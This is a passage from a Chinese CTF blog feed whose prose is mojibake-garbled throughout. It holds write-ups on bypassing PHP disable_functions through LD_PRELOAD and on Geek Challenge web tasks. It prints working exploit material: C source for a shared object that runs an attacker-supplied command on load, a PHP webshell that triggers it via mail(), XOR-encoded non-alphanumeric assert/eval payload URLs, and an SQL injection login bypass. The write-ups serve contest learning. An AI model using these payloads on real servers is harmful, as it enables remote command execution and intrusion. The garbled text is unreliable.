<h4 id="C-è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦"><a href="#C-è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦" class="headerlink" title="C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦"></a>C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦</h4><p>å›åˆ° LD_PRELOAD æœ¬èº«ï¼Œç³»ç»Ÿé€šè¿‡å®ƒé¢„å…ˆåŠ è½½å…±äº«å¯¹è±¡ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼ï¼Œåœ¨åŠ è½½æ—¶å°±æ‰§è¡Œä»£ç ï¼Œè€Œä¸ç”¨è€ƒè™‘åŠ«æŒæŸä¸€ç³»ç»Ÿå‡½æ•°ï¼Œé‚£å°±å®Œå…¨å¯ä»¥ä¸ä¾èµ– sendmail äº† </p>
<p> GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>__attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code> ä¿®é¥°çš„å‡½æ•°ã€‚è¿™ä¸€ç»†èŠ‚éå¸¸é‡è¦ï¼Œå¾ˆå¤šæœ‹å‹ç”¨ LD_PRELOAD æ‰‹æ³•çªç ´ disable_functions æ— æ³•åšåˆ°ç™¾åˆ†ç™¾æˆåŠŸï¼Œæ­£å› ä¸ºè¿™ä¸ªåŸå› ï¼Œ<strong>ä¸è¦å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘æ‹¦åŠ«å¯åŠ¨è¿›ç¨‹è¿™ä¸€è¡Œä¸º</strong>ã€‚ </p>
<p> æ­¤å¤–ï¼Œé€šè¿‡ LD_PRELOAD åŠ«æŒäº†å¯åŠ¨è¿›ç¨‹çš„è¡Œä¸ºï¼ŒåŠ«æŒååˆå¯åŠ¨äº†å¦å¤–çš„æ–°è¿›ç¨‹ï¼Œè‹¥ä¸åœ¨æ–°è¿›ç¨‹å¯åŠ¨å‰å–æ¶ˆ LD_PRELOADï¼Œåˆ™å°†é™·å…¥æ— é™å¾ªç¯ï¼Œæ‰€ä»¥å¿…é¡»å¾—åˆ é™¤ç¯å¢ƒå˜é‡ LD_PRELOADã€‚æœ€ç›´è§‚çš„åšæ³•æ˜¯è°ƒç”¨ <code>unsetenv(&quot;LD_PRELOAD&quot;)</code> </p>
<h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHPä¸­putenv()å‡½æ•°ç”¨äºè®¾ç½®æœåŠ¡å™¨ç¯å¢ƒå˜é‡ï¼Œä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">putenv</span> ( <span class="keyword">string</span> $setting ) : bool</span><br></pre></td></tr></table></figure>

<p>å¦‚</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/evil.so"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="åŠ«æŒå…±äº«åº“ç»•è¿‡disable-functions"><a href="#åŠ«æŒå…±äº«åº“ç»•è¿‡disable-functions" class="headerlink" title="åŠ«æŒå…±äº«åº“ç»•è¿‡disable_functions"></a>åŠ«æŒå…±äº«åº“ç»•è¿‡disable_functions</h4><p>æŠŠreadflagä¸‹è½½åˆ°æœ¬åœ° IDAåç¼–è¯‘</p>
<p> <img src="/2019/10/bypass-disable-functions/1571502795907.png" alt="1571502795907"></p>
<p>bypass.cæ–‡ä»¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ; <span class="comment">//è·å–ç¯å¢ƒå˜é‡</span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="comment">//è·å–EVIL_CMDLINEçš„å€¼</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//ä»ç¯å¢ƒå˜é‡ä¸­éå†â€œLD_PRELOADâ€çš„ä½ç½®ï¼Œå¹¶å°†å…¶å€¼è®¾ä¸ºNULLã€‚</span></span><br><span class="line">    <span class="comment">//ä»è€Œä½¿ä¸‹é¢çš„system()æ­£å¸¸æ‰§è¡Œã€‚</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>

<p>bypass.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline); <span class="comment">//è®¾ç½®EVIL_CMDLINEç¯å¢ƒå˜é‡</span></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);  <span class="comment">//åŠ è½½æ¶æ„åŠ¨æ€åº“</span></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);  <span class="comment">//åˆ©ç”¨mailå‡½æ•°è§¦å‘æ¶æ„å‡½æ•°ï¼Œè·³è½¬è‡³__attribute__ ((__constructor__))ä¿®é¥°çš„å‡½æ•°ã€‚</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayloadä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=include(%27/tmp/bypass.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/bypass_x64.so</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/bypass-disable-functions/image-20191103123740141.png" alt="image-20191103123740141"></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up</title>
    <url>/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼-çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼"><a href="#æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼-çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼" class="headerlink" title="æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼: çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼"></a>æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼: çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼</h2><p>å¼€å±€ä¸€åªçŒ«ï¼Œflagå…¨é æ¡ -_-</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571363272606.png" alt="1571363272606"></p><p>ç›´æ¥F12 æŸ¥çœ‹æºç </p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571363339663.png" alt="1571363339663"></p><p>ç›´æ¥æäº¤cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571363481025.png" alt="1571363481025"></p><h2 id="ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ"><a href="#ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ" class="headerlink" title="ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ"></a>ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571363676296.png" alt="1571363676296"></p><p>ç¡®å®æ˜¯ç™½ç»™çš„shell</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571373932241.png" alt="1571373932241"></p><p>â€‹       æ ¹ç›®å½•ä¸‹å‘ç°flagç›®å½•ä¸‹çš„flag.txt<br>â€‹<br>â€‹             <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374018594.png" alt="1571374018594"><br>â€‹<br>â€‹<br>â€‹    </p><a id="more"></a>











<h2 id="BurpSuiiiiiit-æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§"><a href="#BurpSuiiiiiit-æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§" class="headerlink" title="BurpSuiiiiiit!!!: æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§"></a>BurpSuiiiiiit!!!: æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§</h2><p>é™„ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œè§£å‹å¾—åˆ°Extender.jaræ–‡ä»¶</p>
<p>ä»åå­—å’Œæ ¼å¼çœ‹åº”è¯¥BurpSuitçš„æ‰©å±•åŒ…ï¼Œç”¨BPå¯¼å…¥</p>
<p>â€‹      <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571495641219.png" alt="1571495641219"></p>
<p>â€‹      <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374457080.png" alt="1571374457080"><br>â€‹<br>â€‹              å¯¼å…¥å¤±è´¥ï¼Œå¹¶æç¤ºæˆ‘ä»¬æŸ¥çœ‹errorsé¡µé¢<br>â€‹<br>â€‹             <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374537984.png" alt="1571374537984"></p>
<p>â€‹        flagç›´æ¥å°±å‡ºæ¥äº†</p>
<h2 id="æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚"><a href="#æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚" class="headerlink" title="æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚"></a>æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚</h2><p>è¾“å…¥å§“åå’Œç”Ÿæ—¥åï¼Œè¿”å›äº†ä¸€ä¸ªè·¯å¾„</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374815419.png" alt="1571374815419"></p>
<p>ç›´æ¥è®¿é—®è¯•ä¸‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374878503.png" alt="1571374878503"></p>
<p>å›åˆ°ä¸»é¡µï¼ŒæŸ¥çœ‹æºç </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374951634.png" alt="1571374951634"></p>
<p>æç¤ºæˆ‘ä»¬æ¡ä»¶ç«äº‰ï¼Œä»æºç çœ‹æˆ‘ä»¬è¾“å…¥uå’Œpåï¼Œflagä¼šå†™å…¥åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$savepath<span class="string">" . sha1($_GET['u'])</span></span><br></pre></td></tr></table></figure>

<p>â€‹        0.1såå†æŠŠflagæ¢æˆ you are too slow</p>
<p>â€‹        æ‰€ä»¥æˆ‘ä»¬å…ˆä¸€ç›´è®¿é—®å­˜åœ¨flagçš„è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶ååœ¨æäº¤uå’Œpï¼Œåœ¨flagç”Ÿæˆçš„ä¸€ç¬é—´æŠŠå®ƒè¯»å–</p>
<p>â€‹        ç›´æ¥ä¸Šburpsuit</p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571375619875.png" alt="1571375619875"></p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571376044998.png" alt="1571376044998"></p>
<p>â€‹    payloadè®¾ç½®ä¸ºç©ºï¼Œæ•°é‡200ä¸ªã€‚</p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571375724646.png" alt="1571375724646"></p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571375756868.png" alt="1571375756868"></p>
<p>â€‹    payloadåŒæ ·ä¸ºç©ºï¼Œæ•°é‡ä¸º1.</p>
<p>â€‹    2æ”»å‡»åï¼Œ3ç«‹é©¬æ”»å‡»</p>
<p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571375974330.png" alt="1571375974330"></p>
<p>â€‹    å¾—åˆ°flag</p>
<h2 id="Easysql-æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼"><a href="#Easysql-æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼" class="headerlink" title="Easysql: æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼"></a>Easysql: æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571386357741.png" alt="1571386357741"></p>
<p>ä»€ä¹ˆé˜²æŠ¤éƒ½æ²¡æœ‰ </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">'='</span><br><span class="line">'='</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571387426532.png" alt="1571387426532">    </p>
<p>ç›´æ¥è¿›åå°</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571387449879.png" alt="1571387449879"></p>
<h2 id="RCE-me-I-donâ€™t-think-U-can-system-RCE-prove-to-me"><a href="#RCE-me-I-donâ€™t-think-U-can-system-RCE-prove-to-me" class="headerlink" title="RCE me: I donâ€™t think U can system RCE, prove to me"></a>RCE me: I donâ€™t think U can system RCE, prove to me</h2><p>è¿™é“é¢˜å­¦åˆ°äº†å¾ˆå¤šï¼</p>
<p>æ‰“å¼€ç½‘é¡µçœ‹çœ‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571495997995.png" alt="1571495997995"></p>
<p>GETä¼ å‚codeï¼Œcodeä¸­ä¸èƒ½æœ‰A-Zï¼Œa-zï¼Œ0-9ï¼Œè¿™äº›å­—ç¬¦ï¼Œè€Œä¸”å­—ç¬¦é™åˆ¶åœ¨40ä¸ªå­—ç¬¦</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦å…ˆç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>å‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">pç¥</a>ä¸å«æ•°å­—å’Œå­—æ¯çš„webshell</p>
<p>æ„é€ è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"%"</span>, <span class="string">"\x"</span>, urlencode($aa) . <span class="string">"^"</span> . urlencode($bb) . <span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_url</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> urlencode($aa) . <span class="string">"^"</span> . urlencode($bb). <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> gen(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">echo</span> gen_url(<span class="string">"_GET"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\xA0\xA0\xA0\xA0"</span>^<span class="string">"\xFF\xE7\xE5\xF4"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">"%A0%A0%A0%A0"</span>)^urldecode(<span class="string">"%FF%E7%E5%F4"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<p>æ„é€ å¦‚ä¸‹URl</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>



<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571497597408.png" alt="1571497597408"></p>
<p>æŸ¥çœ‹æŸäº›å…³é”®å‚æ•°</p>
<ul>
<li>â€‹    å¦‚ç³»ç»Ÿä¿¡æ¯</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571499066521.png" alt="1571499066521"></p>
<ul>
<li>disable_functions</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571499768310.png" alt="1571499768310"></p>
<p>å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«ç¦æ­¢äº†</p>
<ul>
<li>allow_url_*</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571498825445.png" alt="1571498825445"></p>
<p>å…³äºè¿™ä¸¤ä¸ªå‚æ•°å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">phpä¼ªåè®®</a></p>
<ul>
<li>sendmail_*</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571499021494.png" alt="1571499021494"></p>
<ul>
<li>open_basedir</li>
</ul>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571500306817.png" alt="1571500306817"></p>
<p>å¹¶æ²¡æœ‰é™åˆ¶æˆ‘ä»¬ç›®å½•ã€‚å¦‚æœæœ‰å¯ä»¥å‚è€ƒè¿™ç¯‡<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">æ–‡ç« </a>ç»•è¿‡</p>
<p>æ—¢ç„¶ä¸èƒ½æ‰§è¡Œå‘½ä»¤é‚£å°±ç”¨var_dump(scandir())æ¥æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=var_dump(scandir(%27/tmp/%27));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571501644752.png" alt="1571501644752"></p>
<p>ä½†æ„Ÿè§‰æŒºéº»çƒ¦çš„ï¼Œåé¢é˜Ÿå‹æäº†ä¸ªè¿™ä¸ª(èººç€çœŸèˆ’æœ )ï¼Œç›´æ¥èšå‰‘è¿(èœåˆ€ä¸è¡Œ)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571502520704.png" alt="1571502520704"></p>
<p>å‘ç°ä¸»ç›®å½•ä¸‹æœ‰æœ‰flagå’Œreadflagï¼Œflagåªèƒ½rootæ‰èƒ½æŸ¥çœ‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571502747158.png" alt="1571502747158"></p>
<p>æŠŠreadflagä¸‹è½½ä¸‹æ¥ï¼Œåç¼–è¯‘äº†ä¸€ä¸‹</p>
